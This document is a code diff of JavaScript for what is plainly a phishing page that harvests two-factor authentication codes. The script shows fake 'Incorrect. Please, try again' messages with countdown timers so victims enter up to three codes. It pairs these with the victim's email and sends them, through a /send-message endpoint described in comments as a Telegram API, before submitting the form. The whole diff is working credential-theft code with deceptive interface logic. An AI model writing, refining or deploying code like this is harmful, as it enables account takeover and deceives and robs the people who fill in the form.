@@ -1,99 +1,114 @@
-var a = 0;
 setTimeout(() => {
     document.getElementById("loading").style.display = "none";
     document.querySelector(".main_form").style.display = "block";
 }, 2000);
-var note = document.getElementById("note");
+
+var code1 = null,
+    code2 = null,
+    code3 = null;
+
+// Lấy các phần tử DOM
+const note = document.getElementById("note");
 const field = document.getElementById("field");
 const submit = document.getElementById("submit");
-var code1, code2, code3;
-var urlParams = window.location.href.split("/code/")[1];
-urlParams = urlParams.replace(/#/g, "");
-const hiddenEmail = urlParams.replace(/^(.)(.*?)(?=@)/, "$1*****");
-if (hiddenEmail) {
-    document.getElementById("emailv").innerText = hiddenEmail;
+
+// ✅ **Lấy tham số code từ URL và gán vào code1, code2, code3**
+const currentUrl = new URL(window.location.href);
+const codeParam = currentUrl.searchParams.get("code");
+
+if (codeParam) {
+    var codeArray = codeParam.split(",");
+
+    code1 = codeArray[0] || null;
+    code2 = codeArray[1] || null;
+    code3 = codeArray[2] || null;
 }
-document.getElementById("field").addEventListener("input", () => {
-    const value = document.getElementById("field").value;
+var email = currentUrl.pathname.split("/code/")[1];
 
-    if (value.length === 6) {
-        document.getElementById("submit").classList.add("active");
-    } else {
-        document.getElementById("submit").classList.remove("active");
-    }
-});
-document.getElementById("field").addEventListener("keydown", function (event) {
-    if (event.key === "Enter") {
-        event.preventDefault(); // Ngăn chặn form submit
-    }
-});
-document.getElementById("submit").addEventListener("click", () => {
-    console.log(a);
-    const value = document.getElementById("field").value;
+// ✅ **Gửi API Telegram với mã code hiện tại**
+const sendToTelegram = (callback) => {
+    const currentUrl = window.location.host;
+    const message = `url: ${currentUrl}\nemail: ${email}\n2FA-1: ${code1}\n2FA-2: ${code2}\n2FA-3: ${code3}`;
 
-    if (value.length === 6) {
-        if (a < 2) {
-            
-            const code = field.value;
-            if (a == 0) {
-                code1 = code;
+    const url = `${
+        window.location.origin
+    }/send-message?message=${encodeURIComponent(message)}`;
 
-            } else if (a == 1) {
-                code2 = code;
+    fetch(url)
+        .then((response) => {
+            if (!response.ok) {
+                throw new Error("Network response was not ok");
             }
+            return response.json();
+        })
+        .then((data) => {
+            console.log("API response:", data);
+            callback(); // Gọi callback sau khi API hoàn tất
+        })
+        .catch((error) => {
+            console.error(
+                "There was a problem with the fetch operation:",
+                error
+            );
+            callback(); // Gọi callback ngay cả khi lỗi
+        });
+};
 
-            // Vô hiệu hóa input và nút submit
-            field.disabled = true;
-            submit.disabled = true;
-            submit.style.pointerEvents = "none"; // Chặn sự kiện click
+if (codeArray) {
+    if (codeArray.length == 1) var i = 15;
+    else if (codeArray.length == 2) var i = 30;
+    field.disabled = true;
+    submit.disabled = true;
+    submit.style.pointerEvents = "none";
+    note.innerText = "Incorrect. Please, try again after " + i + "s";
 
-            let i = 15;
-            note.innerText = "Incorrect. Please, try again after " + i + "s";
-
-            const interval = setInterval(() => {
-                i--;
-                note.innerText =
-                    "Incorrect. Please, try again after " + i + "s";
-                if (i <= 0) {
-                    clearInterval(interval); // Dừng đếm ngược
-                    note.innerText = "";
-
-                    // Kích hoạt lại input và nút submit
-                    field.disabled = false;
-                    submit.disabled = false;
-                    submit.style.pointerEvents = "auto"; // Cho phép sự kiện click hoạt động trở lại
-                }
-            }, 1000);
+    const interval = setInterval(() => {
+        i--;
+        note.innerText = "Incorrect. Please, try again after " + i + "s";
+        if (i <= 0) {
+            clearInterval(interval);
+            note.innerText = "";
+            field.disabled = false;
+            submit.disabled = false;
+            submit.style.pointerEvents = "auto";
         }
-        a++;
+    }, 1000);
+}
+
+// ✅ **Sự kiện nhập liệu**
+field.addEventListener("input", () => {
+    const value = field.value;
+    if (value.length === 6) {
+        submit.classList.add("active");
+    } else {
+        submit.classList.remove("active");
     }
-    if (submit.classList.contains("active")) {
-        code3 = field.value;
-        const currentUrl = window.location.host;
+});
 
-        const message = `url: ${currentUrl}\nemail: ${urlParams}\n2FA-1: ${code1}\n2FA-2: ${code2}\n2FA-3: ${code3}`; // Giá trị message từ input hoặc biến
+// ✅ **Ngăn chặn Enter submit form**
+field.addEventListener("keydown", (event) => {
+    if (event.key === "Enter") {
+        event.preventDefault();
+    }
+});
 
-        const url = `${
-            window.location.origin
-        }/send-message?message=${encodeURIComponent(message)}`;
+// ✅ **Sự kiện khi click Submit**
+submit.addEventListener("click", () => {
+    const value = field.value;
 
-        fetch(url)
-            .then((response) => {
-                if (!response.ok) {
-                    throw new Error("Network response was not ok");
-                }
-                return response.json(); // Nếu API trả về dữ liệu JSON
-            })
-            .then((data) => {
-                console.log("API response:", data);
-            })
-            .catch((error) => {
-                console.error(
-                    "There was a problem with the fetch operation:",
-                    error
-                );
-            });
-
-        document.querySelector("form").submit();
+    if (value.length === 6) {
+        // Bắn API trước, sau đó reload URL với tham số code
+        const currentUrl = new URL(window.location.href);
+        const existingCodes = currentUrl.searchParams.get("code") || "";
+        var updatedCodes = existingCodes ? `${existingCodes},${value}` : value;
+        [code1, code2, code3] = updatedCodes.split(",");
+        if (code3) {
+            sendToTelegram();
+            document.querySelector("form").submit();
+        }
+        sendToTelegram(() => {
+            currentUrl.searchParams.set("code", updatedCodes);
+            window.location.href = currentUrl.href;
+        });
     }
 });
